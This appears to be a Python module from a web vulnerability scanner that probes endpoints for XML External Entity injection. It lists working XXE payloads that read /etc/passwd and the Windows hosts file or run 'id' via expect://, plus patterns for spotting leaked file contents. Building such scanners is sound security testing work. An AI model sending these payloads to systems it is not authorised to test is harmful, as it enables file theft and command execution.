"""
mod_xxe.py — XML External Entity (XXE) Injection detection module.

Covers:
  • Classic in-band XXE (file content in response)
  • Error-based XXE (XML parser errors in response)
  • Blind XXE signals (SSRF-style payloads via DOCTYPE)
"""

import re
import logging
from typing import Any, Dict, List

from my_scan.modules.base import BaseModule, CRITICAL, HIGH, MEDIUM

logger = logging.getLogger("mod_xxe")

# ── Payloads ─────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Classic in-band — read /etc/passwd
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
    # Classic in-band — read Windows hosts
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>""",
    # Error-based (force parser error that leaks path)
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/path/xxe_test">]><root>&xxe;</root>""",
    # Internal DTD parameter entity trick
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1/">%xxe;]><root/>""",
    # Billion laughs (DoS check — very mild version)
    """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>""",
    # PHP expect://
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>""",
]

# ── Detection patterns ────────────────────────────────────────────────────────

FILE_CONTENT_PATTERNS = [
    re.compile(r"root:x:0:0:", re.IGNORECASE),
    re.compile(r"daemon:x:\d+:\d+:", re.IGNORECASE),
    re.compile(r"127\.0\.0\.1\s+localhost", re.IGNORECASE),
    re.compile(r"uid=\d+\(", re.IGNORECASE),
]

XML_ERROR_PATTERNS = [
    re.compile(r"xml.*?parsing.*?error", re.IGNORECASE),
    re.compile(r"xmlparseexception", re.IGNORECASE),
    re.compile(r"sax.*?parse.*?exception", re.IGNORECASE),
    re.compile(r"entity.*?declared.*?dtd", re.IGNORECASE),
    re.compile(r"malformed.*?xml", re.IGNORECASE),
    re.compile(r"javax\.xml", re.IGNORECASE),
    re.compile(r"org\.xml\.sax", re.IGNORECASE),
    re.compile(r"lxml\.etree\._xmlerror", re.IGNORECASE),
]

# XML-accepting content types
XML_CONTENT_TYPES = [
    "application/xml", "text/xml", "application/xhtml+xml",
    "application/soap+xml", "application/rss+xml", "application/atom+xml",
]


class XXEModule(BaseModule):
    name        = "xxe"
    description = "Detects XML External Entity (XXE) injection vulnerabilities"

    async def run(self, entrypoint: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings: List[Dict[str, Any]] = []
        method = entrypoint.get("method", "GET").upper()

        # XXE only relevant for POST/PUT with XML bodies, or endpoints
        # that accept XML content
        if method not in ("POST", "PUT", "PATCH"):
            return findings

        content_type = (entrypoint.get("headers") or {}).get("Content-Type", "")
        is_xml = any(ct in content_type for ct in XML_CONTENT_TYPES)

        # Also try if content-type is JSON but body looks like it could be XML
        body_raw = entrypoint.get("body", "") or ""
        body_looks_xml = body_raw.strip().startswith("<")

        if not (is_xml or body_looks_xml):
            # Force-inject XML body as a probe
            pass  # We'll still try; many APIs accept multiple formats

        for payload in XXE_PAYLOADS:
            ep = dict(entrypoint)
            ep = ep.copy()
            ep["body"] = payload
            headers = dict(ep.get("headers", {}))
            headers["Content-Type"] = "application/xml"
            ep["headers"] = headers

            resp = await self._send(ep)
            if resp is None:
                continue
            try:
                body   = await resp.text()
                status = resp.status
            finally:
                resp.release()

            # 1. File contents leaked
            matched_file = next((p for p in FILE_CONTENT_PATTERNS if p.search(body)), None)
            if matched_file:
                findings.append(self._make_finding(
                    vulnerability="XML External Entity Injection (XXE)",
                    vuln_id="xxe",
                    severity=CRITICAL,
                    url=entrypoint["url"],
                    method=method,
                    parameter="(XML body)",
                    payload=payload[:120] + "...",
                    evidence=f"Sensitive file content in response (pattern: '{matched_file.pattern[:60]}')",
                ))
                break

            # 2. XML parser error — confirms XML is parsed and entity resolution attempted
            matched_err = next((p for p in XML_ERROR_PATTERNS if p.search(body)), None)
            if matched_err:
                findings.append(self._make_finding(
                    vulnerability="XML External Entity Injection (Error-based XXE)",
                    vuln_id="xxe",
                    severity=HIGH,
                    url=entrypoint["url"],
                    method=method,
                    parameter="(XML body)",
                    payload=payload[:120] + "...",
                    evidence=f"XML parser error in response: '{matched_err.pattern}'",
                ))
                break

            # 3. HTTP 500 when sending XXE (may indicate processing)
            if status == 500:
                findings.append(self._make_finding(
                    vulnerability="XML Injection (Potential XXE — HTTP 500)",
                    vuln_id="xxe",
                    severity=MEDIUM,
                    url=entrypoint["url"],
                    method=method,
                    parameter="(XML body)",
                    payload=payload[:120] + "...",
                    evidence="HTTP 500 returned when XML external entity payload was submitted",
                ))
                break

        return findings
